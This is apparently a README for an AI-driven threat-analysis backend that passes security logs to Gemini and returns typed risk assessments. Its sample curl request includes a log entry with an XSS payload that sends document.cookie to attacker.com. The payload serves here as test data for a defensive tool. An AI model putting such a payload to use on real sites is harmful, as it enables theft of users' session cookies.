# AI Threat Analysis Integration Module

This subdirectory holds the complete standalone backend logic for the AI-driven security incident response pipeline. It functions as an analytical layer that translates unstructured system logs into machine-readable threat assessments.

## 🛠️ Module Architecture

* `threatService.ts`: Houses the log filtration logic, markdown code-block prompt builders (preventing prompt injection attacks), and the resilient Gemini client wrapper.
* `server.ts`: Houses the dedicated `/api/analyze-threat` endpoint routing infrastructure.

## ⚙️ Resilience & Error Mitigation
* **503 Handling**: The integration includes a 3-pass loop configuration running on an exponential backoff time delay to absorb transient server availability spikes.
* **Local Fallback Object**: If connection errors persist past max retries, the backend returns a localized structural evaluation payload, ensuring application routes never freeze or crash.

## 🚀 Running & Testing the Endpoint

1. **Verify your environment variable matches:**
   Ensure `GEMINI_API_KEY` is specified in your application's active `.env` profile.

2. **Boot up the localized service runner:**
   ```bash
   npm run dev
   ```

3. **Fire a test payload (Simulated XSS Attack):**
   Execute this payload from a secondary terminal prompt to trace the automated validation sequence:
   ```bash
   curl -X POST http://localhost:3000/api/analyze-threat \
   -H "Content-Type: application/json" \
   -d '{
     "logs": [
       {
         "timestamp": "2026-06-11T10:15:00Z",
         "sourceIp": "203.0.113.105",
         "eventType": "WEB_REQUEST_ANOMALY",
         "details": "User-Agent string containing suspicious binary characters",
         "severity": "MEDIUM"
       },
       {
         "timestamp": "2026-06-11T10:15:05Z",
         "sourceIp": "203.0.113.105",
         "eventType": "XSS_DETECTION",
         "details": "Payload blocked: <script>document.location='\''http://attacker.com'\''+document.cookie</script>",
         "severity": "HIGH"
       }
     ]
   }'
   ```

### Output Schema Spec
The backend forces Gemini to return strict, typed parameters conforming to this layout structure:
```json
{
  "incidentId": "INC-843921",
  "processedLogsCount": 2,
  "analysis": {
    "riskScore": 95,
    "threatActor": "Cross-Site Scripting Bot/Exploiter",
    "attackVector": "Malicious code injections sent through parameters.",
    "confidenceLevel": "HIGH",
    "mitigationSteps": [
      "Blacklist or quarantine source IP 203.0.113.105.",
      "Deploy localized WAF rules to reject script injection patterns."
    ]
  }
}
```
